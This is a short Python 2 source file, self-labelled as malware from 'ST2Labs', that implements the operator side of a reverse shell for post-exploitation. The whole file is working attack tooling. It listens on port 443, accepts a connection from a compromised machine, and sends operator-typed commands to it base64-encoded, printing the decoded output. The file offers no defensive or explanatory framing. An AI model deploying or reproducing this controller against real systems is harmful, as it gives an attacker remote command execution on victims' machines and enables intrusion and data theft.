"""
    @Malware
    ST2Labs / GEO SYSTEM SOFTWARE
 
    Python Reverse Shell / Post-Explotation
 
    ; Client for Python Reverse Shell
 
"""
import sys
import base64
import socket
import os

 
# Decode Base64 data
def decode(data):
    if len(data) % 4 != 0:  # check if multiple of 4
        while len(data) % 4 != 0:
            data = data + "="
        req_str = base64.b64decode(data)
    else:
        req_str = base64.b64decode(data)
    return req_str
 
 
def option(con, cmd):

    con.send(base64.b64encode(cmd))
    data = con.recv(8192)
    req_str = decode(data)
    return req_str
 
 
def main():
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
    # Bind the socket to the address given on the command line
    server_address = ('', 443)
    sock.bind(server_address)
    print >>sys.stderr, ''
    print >>sys.stderr, ' [*] Starting up on %s port %s' % sock.getsockname()
    sock.listen(1)
 
    while True:
        print >>sys.stderr, ''
        print >>sys.stderr, '   - Waiting for a connection'
        print >>sys.stderr, '     Press CRTL+C to exit'
        con, client_address = sock.accept()
        try:
            print >>sys.stderr, '   - Client connected:', client_address
            data = con.recv(1024)
            data = decode(data)
            print '   {}'.format(data)
            print >>sys.stderr, ''
            while True:
                cmd = raw_input("Enter Command: ")
                if cmd:
                    if cmd == "quit":
                        break
                    req_str = option(con, cmd)
                    print >>sys.stderr, ''
                    print >>sys.stderr, '%s' % req_str
                    print >>sys.stderr, ''
        except KeyboardInterrupt:
            sys.exit(2)
        finally:
            con.close()
 
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
            sys.exit(2)
